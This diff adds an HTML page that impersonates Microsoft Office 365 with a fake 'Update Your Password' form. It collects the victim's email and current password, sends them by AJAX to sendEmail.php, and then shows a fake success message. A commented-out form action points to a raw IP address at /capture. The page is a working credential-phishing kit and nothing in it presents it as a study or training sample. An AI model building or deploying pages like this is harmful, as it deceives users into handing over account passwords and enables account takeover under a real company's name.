@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+    <title>Microsoft Office 365 - Password Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            color: #0078d4;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        img {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #005a9e;
+        }
+        p {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+    </style>
+    
+                    <script>
+							$(document).ready(function() {
+								$('#contact-form').on('submit', function(e) {
+									e.preventDefault();  // Prevent the default form submission
+
+									$.ajax({
+										url: 'sendEmail.php',  // URL to the PHP script
+										type: 'POST',
+										data: $(this).serialize(),  // Serialize form data
+										success: function(response) {
+                                            $('#contact-form').hide();
+											$('#status').html('<h2> Password Changedd.</h2>');
+										},
+										error: function() {
+											$('#status').html('<h2>Ihre Nachricht wurde nicht gesendet. Bitte noch einmal.</h2>');
+										}
+									});
+								});
+							});
+                    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+        <h1>Update Your Password</h1>
+        <form  id="contact-form"  method="post">
+        <!-- <form action="http://134.101.174.190:5000/capture" method="post"> -->
+            <input type="email"  id="email" name="email" placeholder="Enter your email" required>
+            <input type="password" name="old_password" placeholder="Enter your current password" required>
+            <input type="password" id="new_password" name="new_password" placeholder="Enter your new password" required>
+            <input type="password" name="confirm_password" placeholder="Confirm your new password" required>
+            <button type="submit">Update Password</button>
+        </form>
+        <div id="status"></div>
+        <p>Your password must be updated to comply with our latest security standards.</p>
+    </div>
+</body>
+</html>
